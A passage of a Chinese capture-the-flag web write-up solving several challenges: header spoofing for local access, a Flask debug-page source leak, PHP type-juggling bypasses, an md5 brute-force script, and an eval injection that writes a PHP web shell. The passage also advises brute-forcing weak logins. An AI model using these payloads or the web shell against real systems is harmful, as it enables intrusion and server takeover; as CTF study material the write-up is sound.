+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111449345.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111449345.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111449345.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111449345.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111449345.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111449345.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最后一个关：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111525058.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111525058.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111525058.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111525058.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111525058.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111525058.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>和本地访问有关的是：X-Forwarded-For或者X-Real-IP，发现是X-Real-IP，添加头为127.0.0.1发送即可：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111705008.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111705008.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111705008.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111705008.png?size=large 2x" sizes="auto" data-title="image-20231002111705008" data-alt="image-20231002111705008" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111720295.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111720295.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111720295.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111720295.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111720295.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111720295.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="errorflask">ErrorFlask</h1>
+<p>这里本来想的是命令注入这类的东西，但是试了几个不太行。回头看看Error，大概知道是报错的问题，于是直接搞点错误：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112621122.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112621122.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112621122.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112621122.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112621122.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112621122.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112659103.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112659103.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112659103.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112659103.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112659103.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112659103.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现是python，我们发现app.py是源文件，而且错误好像还可以展开的样子：打开来看看</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112737977.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112737977.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112737977.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112737977.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112737977.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112737977.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现flag。</p>
+<h1 id="begin-of-php">Begin of PHP</h1>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;=Level 1=&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$flag1</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nope,this is level 1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$flag1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;=Level 2=&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key3&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key3&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key3&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$flag2</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nope,this is level 2&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$flag2</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;=Level 3=&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key4&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strcmp</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key4&#39;</span><span class="p">],</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$flag3</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nope,this is level 3&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$flag3</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;=Level 4=&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key5&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key5&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key5&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">2023</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$flag4</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nope,this is level 4&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$flag4</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;=Level 5=&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$var</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-zA-Z0-9]/&#34;</span><span class="p">,</span><span class="nv">$var</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nope,this is level 5&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$flag5</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nope,this is level 5&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这么一大段代码：，总结下来有几个考点:</p>
+<ul>
+<li>绕过md5</li>
+<li>绕过sha1</li>
+<li>绕过strcmp</li>
+<li>绕过is_numeric</li>
+<li>绕过preg_match</li>
+</ul>
+<p>我们一个个解决：</p>
+<ul>
+<li>
+<p>md5=md5，这种类型可以直接传入数组，因为md5(数组)=null，null=null</p>
+</li>
+<li>
+<p>sha1同理。md5和sha1还可以使用0e绕过（得益于php的弱类型比较），具体参考：<a href="https://blog.csdn.net/weixin_46578840/article/details/119569862"target="_blank" rel="external nofollow noopener noreferrer">PHP中sha1()函数和md5()函数的绕过_sha1绕过-CSDN博客</a>。我这里使用的数组绕过，简单又快捷</p>
+</li>
+<li>
+<p>strcmp(数组,anystring) ==0</p>
+</li>
+<li>
+<p>is_numeric(字符串)==false，根据弱类型比较，&lsquo;数字+字符&rsquo; == 数字。</p>
+</li>
+<li>
+<p>preg_match(任意规则，数组)=0，当然，由于flag5在源码中不存在，必须在POST中传入一个flag5。</p>
+</li>
+</ul>
+<p>综上，payload为</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002113844169.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002113844169.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002113844169.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002113844169.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002113844169.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002113844169.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002113904490.png" srcset="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002113904490.png?size=small, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002113904490.png?size=medium 1.5x, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002113904490.png?size=large 2x" sizes="auto" data-title="image-20231002113904490" data-alt="image-20231002113904490" class="suffix-invalid" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="rce">R!C!E</h1>
+<p>题目够阴。</p>
+<p>首先使用md5碰撞将password找出来，示例代码如下：</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5crack</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span><span class="n">num</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]Check </span><span class="si">{}</span><span class="s2"> for </span><span class="si">{}</span><span class="s2">.&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">pre</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="o">==</span> <span class="nb">str</span><span class="p">(</span><span class="n">pre</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]</span><span class="si">{}</span><span class="s2"> correct!The md5 is </span><span class="si">{}</span><span class="s2">.&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]</span><span class="si">{}</span><span class="s2"> wrong!&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">md5crack</span><span class="p">(</span><span class="s2">&#34;c4d038&#34;</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现password=114514</p>
+<p>下面，我们发现直接POST传e_v.a.l不会接收到任何数据，原因是php会对非法字符进行过滤，并将其修改为__（下划线）。但是该操作只会进行一次。（神奇的脑回路）非法字符如下：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114225930.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114225930.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114225930.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114225930.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114225930.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114225930.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>于是为了让e_v.a.l中的.不被替换，我们将其中的下划线改为非法字符(])，然后让其变化一次阻止其继续变化。</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password=114514&amp;e[v.a.l=phpinfo();</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功了：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114547184.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114547184.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114547184.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114547184.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114547184.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114547184.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里发现没有屏蔽fputs，直接写入木马，然后上蚁剑：</p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115040330.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115040330.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115040330.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115040330.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115040330.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115040330.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115109139.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115109139.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115109139.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115109139.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115109139.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115109139.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="easy-login">Easy Login</h1>
+<p>以后碰到用户名密码一定先弱口令爆破！！！</p>
